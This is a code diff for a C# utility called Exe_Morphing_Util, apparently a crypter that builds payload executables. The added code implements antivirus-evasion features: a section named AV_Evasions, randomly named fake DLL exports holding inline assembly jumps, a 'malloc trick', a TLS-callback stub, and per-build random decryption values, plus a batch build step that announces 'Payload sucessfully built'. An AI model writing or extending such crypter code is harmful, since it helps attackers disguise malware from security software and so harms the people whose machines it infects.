@@ -20,9 +20,21 @@ namespace Exe_Morphing_Util
         
         public int payloadcryptkey;
         bool devmode = true;
-        
-        
-        
+
+        private static string RandomStringJustChars(int size) // need just 
+        {
+            Sleep(300);
+            string _chars = "abcdefghijklmnopqrstuvwxyz";
+            Random _rng = new Random((int)GetTickCount());
+            char[] buffer = new char[size];
+
+            for (int i = 0; i < size; i++)
+            {
+                buffer[i] = _chars[_rng.Next(_chars.Length)];
+            }
+            return new string(buffer);
+        }
+
 
 
         private string[] str_psapi_funcs = new string[]
@@ -58,6 +70,8 @@ namespace Exe_Morphing_Util
         
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern UInt32 GetTickCount();
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern void Sleep(int seconds);
 
         private void btnLoadFile_Click(object sender, EventArgs e)
         {
@@ -649,9 +663,19 @@ namespace Exe_Morphing_Util
         
         private void AV_Evasions()
         {
+
             // gonna need to find the EP, save it, find a cave, replace the intial stack frame setup (push ebp, mov ebp, esp) 
             // with long jmp to our found code cave, have it jump back when done to our EP
+            if(cbTLS.Checked)
+            {
+                /*
+                string randofuncname = RandomString(9);
+                File.Copy("barebones\\dont_touch_me_TLS_callbacks.joe", "builder\\joe_crypter.c", true);
+                StreamWriter jw = new StreamWriter("builder\\joe_crypter.c", true);
+                //jw.finsih me soon */
 
+
+            }
             File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
             FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
             StreamWriter sw = new StreamWriter(fs);
@@ -744,6 +768,49 @@ namespace Exe_Morphing_Util
 
 
             }
+            if(cbFakeExports.Checked)
+            {
+
+                string[] datatype, returntype;
+
+                Random rand = new Random();
+
+                int x = rand.Next(1, 9); // random number of exports
+                for (int y = 0; y <= x; y++)
+                { 
+
+                    string randofuncname = RandomStringJustChars(rand.Next(5, 15));
+                    string randomargumentname = RandomStringJustChars(rand.Next(5, 15));
+                    datatype = new string[5] { "int", "char*", "float", "double", "long" };
+                    returntype = new string[5] { "int", "char*", "float", "double", "long" };
+                    int q = rand.Next(0, 99999); // q is datatype
+                    int r = rand.Next(1, 5); // r is data type or function arguments
+                    int s = rand.Next(1, 5); // s is return type
+                    string text = File.ReadAllText("builder\\joe_crypter.c");
+
+
+                    text = text.Replace("//replaceatbeginning" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ");");
+
+
+                    if (returntype[s] == "char*")
+                    {
+                        text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { " +
+                            "\r\n \r\n __asm{ \r\n jmp eax \r\n } \r\n" +
+                            "return \"" + RandomStringJustChars(rand.Next(5, 15)) + "\"; \r\n }\r\n //");
+
+                    }
+                    else
+                    {
+                        text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { \r\n" +
+                            "\r\n \r\n __asm{ \r\n jmp ebx \r\n } \r\n" + "return " + q + "; \r\n }\r\n //");
+
+                    }
+                    File.WriteAllText("builder\\joe_crypter.c", text);
+
+
+                }
+
+            }
             if (cbMallocTrick.Checked)
             {
                 sw.WriteLine("AllocMem_Fornoreason();");
@@ -771,7 +838,7 @@ namespace Exe_Morphing_Util
 
         }
     
-        private static void MakeLoader() // shit dont work. find out why 
+        private static void MakeLoader() 
         {
             // first cc, then rc, then link
 
@@ -811,6 +878,15 @@ namespace Exe_Morphing_Util
             sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
                 "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
                 "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
+            sw.WriteLine("echo        _             _____                  _            ");
+            sw.WriteLine("echo       | |           / ____|                | |           ");
+            sw.WriteLine("echo       | | ___   ___| |     _ __ _   _ _ __ | |_ ___ _ __ ");
+            sw.WriteLine("echo   _   | |/ _\\ / _\\ |    | '__| | | | '_\\| __/ _\\ '__|");
+            sw.WriteLine("echo  | |__| | (_) |  __/ |____| |  | |_| | |_) | ||  __/ |   ");
+            sw.WriteLine("echo  \\____/\\_\\/\\__|\\_____|_|  \\__, | .__/\\_\\___|_|   ");
+            sw.WriteLine("echo                                  __/ | |                 ");
+            sw.WriteLine("echo                                 |___/|_|                 ");
+
             sw.WriteLine("echo Payload sucessfully built and saved to " + finalexe);
             sw.WriteLine("pause");
 			
@@ -1253,6 +1329,22 @@ namespace Exe_Morphing_Util
         private void seriouslyHelpToolStripMenuItem_Click(object sender, EventArgs e)
         {
             System.Diagnostics.Process.Start("https://gironsec.com/blog");
+        }
+
+        private void randcharsfordecryption(int which)
+        {
+            switch (which)
+            {
+                case 1:
+                    break;
+                case 2:
+                    break;
+            }
+
+            Random rnd = new Random();
+            string text = File.ReadAllText("test.txt");
+            text = text.Replace("__randval__", rnd.Next(1, 255).ToString());
+            File.WriteAllText("test.txt", text);
         }
     }
 }
